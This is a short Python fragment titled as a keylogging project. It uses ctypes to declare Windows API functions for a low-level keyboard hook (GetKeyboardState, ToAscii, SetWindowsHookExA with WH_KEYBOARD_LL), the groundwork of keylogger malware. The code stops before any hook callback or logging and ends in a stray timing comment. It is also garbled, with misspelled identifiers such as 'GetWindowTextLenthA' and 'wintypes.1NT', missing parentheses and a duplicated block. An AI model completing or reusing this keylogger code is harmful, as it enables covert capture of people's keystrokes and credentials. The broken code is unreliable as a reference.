#Project #3 - Keylogging a System
from ctypes import *
from ctypes import wintypes


user32 = windll.user32

LRESULT = c_long
WH_KEYBOARD_LL = 13

WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10


GetWindowTextLengthA = user32.GetWindowTextLenthA
GetWindowTextLengthA. argtypes=(wintypes.HANDLE, )
GetWindowTextLengthA. restype = wintypes.INT


GetWindowTextLengthA = user32.GetWindowTextLenthA
GetWindowTextLengthA.argtypes = (wintypes.HANDLE, )
GetWindowTextLengthA. restype = wintypes.INT

GetWindowTextA = user32.GetWindowTextA 
GetWindowTextA.argtypes =(wintypes.HANDLE, wintypes.LPSTR, wintypes.1NT)
GetWindowTextA.restype = wintypes. INT

GetKeyState = user32.GetKeyState 
GetKeyState.argtypes = (wintypes.INT, )
GetKeyState.restype = wintypes.SHORT

 
keyboard_state = wintypes.PBYTE * 256
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(keyboard_state),
GetKeyboardState.restype = wintyles. BOOL
 

ToAscii = user32.ToAscii
ToAscii.argtypes = wintypes.UINT, POINTER(keyboard_state),  wintypes.LPWORD, wintypes.UINT)
ToAscii.restype= LRESULT

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA. argtypes = (wintypes.INT, )




#10 first min of 15min.

